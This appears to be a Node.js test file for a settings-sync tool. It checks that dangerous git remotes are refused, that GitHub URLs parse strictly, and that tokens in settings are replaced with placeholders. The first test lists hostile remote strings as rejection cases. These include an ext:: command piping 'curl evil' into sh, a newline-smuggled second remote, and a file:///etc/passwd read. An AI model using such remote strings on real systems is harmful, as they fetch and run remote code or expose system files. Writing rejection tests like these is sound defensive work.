import { test } from 'node:test';
import assert from 'node:assert/strict';
import { assertSafeRemote, parseGitHub } from '../src/sync.mjs';
import { isExecutable } from '../src/classify.mjs';
import { inferExec } from '../src/rewrite.mjs';
import { sanitizeSettings } from '../src/settings.mjs';

test('sync: git ext::/fd:: transport remotes are refused', () => {
  for (const bad of [
    'ext::sh -c "curl evil|sh"',
    'ext::sh -c x -- github.com/octocat/nope',
    'fd::17',
    'file:///etc/passwd',
    'https://github.com/o/r\next::sh -c evil'
  ]) {
    assert.throws(() => assertSafeRemote(bad), /refusing remote/, `should refuse: ${bad}`);
  }
});

test('sync: legitimate https/ssh remotes are allowed', () => {
  for (const ok of ['https://github.com/o/r.git', 'git@github.com:o/r.git', 'ssh://git@example.com/o/r.git']) {
    assert.equal(assertSafeRemote(ok), ok);
  }
});

test('sync: parseGitHub only matches real github URLs, not trailing substrings', () => {
  assert.equal(parseGitHub('ext::sh -c x -- github.com/octocat/nope'), null);
  assert.deepEqual(parseGitHub('https://github.com/octocat/hello'), { owner: 'octocat', repo: 'hello' });
  assert.deepEqual(parseGitHub('git@github.com:octocat/hello.git'), { owner: 'octocat', repo: 'hello' });
});

test('trust-gate: isExecutable and inferExec agree on .command (macOS double-click scripts)', () => {
  const body = Buffer.from('echo hi\n');
  assert.equal(isExecutable('hooks/launcher.command', body), true);
  assert.equal(inferExec('hooks/launcher.command', body), true);
  assert.equal(isExecutable('hooks/x.command', body), inferExec('hooks/x.command', body));
});

test('pack: top-level settings.env values are stripped wholesale regardless of key name', () => {
  const r = sanitizeSettings({
    env: {
      NPM_RC: '//registry.npmjs.org/:_authToken=abcd1234efgh5678',
      LICENSE: 'company-internal-license-000111222',
      GH_TOKEN: 'ghp_realtoken',
      ALREADY: '${ENV_ALREADY}'
    }
  });
  assert.equal(r.shared.env.NPM_RC, '${ENV_NPM_RC}');
  assert.equal(r.shared.env.LICENSE, '${ENV_LICENSE}');
  assert.equal(r.shared.env.GH_TOKEN, '${ENV_GH_TOKEN}');
  assert.equal(r.shared.env.ALREADY, '${ENV_ALREADY}');
  for (const v of Object.values(r.shared.env)) assert.match(v, /^\$\{.+\}$/);
});

test('pack: top-level settings.headers values are stripped wholesale', () => {
  const r = sanitizeSettings({ headers: { Authorization: 'Bearer sk-xyz', 'X-Custom': 'plainvalue' } });
  for (const v of Object.values(r.shared.headers)) assert.match(v, /^\$\{.+\}$/);
});
